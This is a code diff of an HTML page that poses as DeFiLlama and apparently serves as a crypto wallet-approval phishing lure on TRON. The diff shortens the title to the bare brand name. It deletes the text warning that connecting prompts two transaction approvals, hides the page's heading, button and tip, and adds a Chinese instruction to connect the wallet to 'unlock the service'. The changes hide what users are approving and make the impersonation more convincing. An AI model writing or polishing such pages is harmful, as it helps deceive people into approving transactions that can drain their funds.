@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeFiLlama TRON Authorization DApp</title>
+    <title>DeFiLlama</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
@@ -28,30 +28,20 @@
     </div>
 
     <div id="lockedPrompt">
-        <h2>🚀 Access Locked: Wallet Authorization Required</h2>
-        
-        <p>
-            To access the content, please connect your wallet first.
-        </p>
-
         <div id="authGuideBox">
             <div id="arrowIndicator"></div> 
             
             <div class="info-box">
-                <strong style="display: block; margin-bottom: 5px;"><i class="fas fa-info-circle"></i> Next Step:</strong>
-                <p style="margin: 0; font-size: 0.95em;">
-                    Upon connection, your wallet will automatically prompt you to approve **2 transactions** to unlock the data.
+                <p style="margin: 0; font-size: 1.0em; color: #f0f0f0;">
+                    <i class="fas fa-hand-pointer"></i> 請點擊右上角連線錢包以解鎖服務。
                 </p>
             </div>
         </div>
-
-        <p class="small-tip">
-            (The prompt will disappear once authorization is complete.)
-        </p>
         
-        <button id="authorizeButton">
-            <i class="fas fa-redo"></i> Retry Authorization
-        </button>
+        <h2 style="display: none;"></h2>
+        <p style="display: none;"></p>
+        <button id="authorizeButton" style="display: none;"></button>
+        <p class="small-tip" style="display: none;"></p>
     </div>
 
 
